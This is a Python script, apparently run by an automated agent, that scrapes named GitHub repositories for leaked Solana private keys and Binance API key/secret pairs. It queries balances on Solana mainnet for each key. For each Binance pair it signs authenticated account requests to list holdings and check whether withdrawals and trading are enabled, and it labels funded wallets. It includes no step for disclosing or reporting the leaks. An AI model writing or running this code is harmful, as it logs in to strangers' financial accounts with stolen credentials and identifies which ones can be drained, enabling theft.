#!/usr/bin/env python3
"""Probe crypto keys found in active Telegram bot repos."""
import json, re, urllib.request, urllib.error, time, hmac, hashlib, glob

def get_raw(url):
    raw = url.replace('github.com','raw.githubusercontent.com').replace('/blob/','/')
    try:
        r = urllib.request.urlopen(urllib.request.Request(raw, headers={'User-Agent':'curl/7.0'}), timeout=10)
        return r.read().decode('utf-8', errors='replace')[:12000]
    except: return ''

B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
B58M = {c:i for i,c in enumerate(B58)}
def b58dec(s):
    n = 0
    for c in s: n = n*58 + B58M[c]
    res = []
    while n > 0: res.append(n & 0xff); n >>= 8
    for c in s:
        if c == '1': res.append(0)
        else: break
    return bytes(reversed(res))

def b58enc(d):
    n = int.from_bytes(d, 'big'); res = []
    while n > 0: res.append(B58[n % 58]); n //= 58
    for b in d:
        if b == 0: res.append('1')
        else: break
    return ''.join(reversed(res))

def sol_balance(b58key):
    try:
        kb = b58dec(b58key)
        if len(kb) != 64: return None, None
        pub = b58enc(kb[32:])
        body = json.dumps({'jsonrpc':'2.0','id':1,'method':'getBalance',
                          'params':[pub,{'commitment':'confirmed'}]}).encode()
        req = urllib.request.Request('https://api.mainnet-beta.solana.com', data=body,
            headers={'Content-Type':'application/json','User-Agent':'curl/7.0'})
        r = urllib.request.urlopen(req, timeout=12)
        data = json.loads(r.read())
        lamps = data.get('result',{}).get('value', 0)
        return pub, lamps / 1e9
    except:
        return None, None

SOL_RE = re.compile(r'[1-9A-HJ-NP-Za-km-z]{87,88}')
BN_KEY = re.compile(r'(?:BINANCE_API_KEY|binance_api_key)\s*[=:\s"\']+([A-Za-z0-9]{18,})', re.I)
BN_SEC = re.compile(r'BINANCE_(?:SECRET_KEY|API_SECRET)\s*[=:\s"\']+([A-Za-z0-9]{40,})', re.I)

TARGET_REPOS = [
    'katlogic/solana-arbitrage-bot',
    'decentralized-86/Pump_Dump',
    'AlphaDeFalcon/JIDIPay',
]

seen_sol = set()
seen_bn = set()

print('=== SOLANA (arbitrage + pump bot repos) ===')
for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            if not any(e['repo'].startswith(t) for t in TARGET_REPOS[:2]):
                continue
            content = get_raw(e['url'])
            time.sleep(0.2)
            keys = SOL_RE.findall(content)
            for k in keys:
                if len(k) not in (87, 88): continue
                if k in seen_sol: continue
                seen_sol.add(k)
                pub, bal = sol_balance(k)
                time.sleep(0.3)
                if pub:
                    label = '*** FUNDED ***' if bal and bal > 0.001 else 'dust/zero'
                    print(label + ' ' + str(round(bal or 0, 6)) + ' SOL')
                    print('  pub: ' + pub)
                    print('  repo: ' + e['repo'] + '/' + e['path'])
        except:
            pass

print()
print('=== BINANCE (BeetahEscrow / JIDIPay) ===')
for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            if 'JIDIPay' not in e['repo']:
                continue
            content = get_raw(e['url'])
            km = BN_KEY.search(content)
            sm = BN_SEC.search(content)
            if not km or not sm:
                continue
            k, s = km.group(1).strip(), sm.group(1).strip()
            if k in seen_bn: continue
            seen_bn.add(k)
            ts = str(int(time.time()*1000))
            qs = 'timestamp=' + ts
            sig = hmac.new(s.encode(), qs.encode(), hashlib.sha256).hexdigest()
            req = urllib.request.Request(
                'https://api.binance.com/api/v3/account?' + qs + '&signature=' + sig,
                headers={'X-MBX-APIKEY': k, 'User-Agent': 'curl/7.0'})
            try:
                data = json.loads(urllib.request.urlopen(req, timeout=12).read())
                bals = [b for b in data.get('balances',[]) if float(b['free'])>0 or float(b['locked'])>0]
                print('LIVE uid=' + str(data.get('uid','')))
                for b in bals[:10]: print('  ' + b['asset'] + ': ' + b['free'])
                if not bals: print('  no balance')
                # check permissions
                ts2 = str(int(time.time()*1000))
                qs2 = 'timestamp=' + ts2
                sig2 = hmac.new(s.encode(), qs2.encode(), hashlib.sha256).hexdigest()
                req2 = urllib.request.Request(
                    'https://api.binance.com/sapi/v1/account/apiRestrictions?' + qs2 + '&signature=' + sig2,
                    headers={'X-MBX-APIKEY': k, 'User-Agent': 'curl/7.0'})
                perms = json.loads(urllib.request.urlopen(req2, timeout=12).read())
                print('  withdraw=' + str(perms.get('enableWithdrawals',False)))
                print('  trade='    + str(perms.get('enableSpotAndMarginTrading',False)))
                print('  ip_lock='  + str(perms.get('ipRestrict',False)))
            except urllib.error.HTTPError as ex:
                body2 = ex.read().decode()
                c = re.search(r'"code":(-?\d+)', body2)
                print('DEAD/RESTRICTED code=' + (c.group(1) if c else str(ex.code)))
            time.sleep(0.5)
        except:
            pass
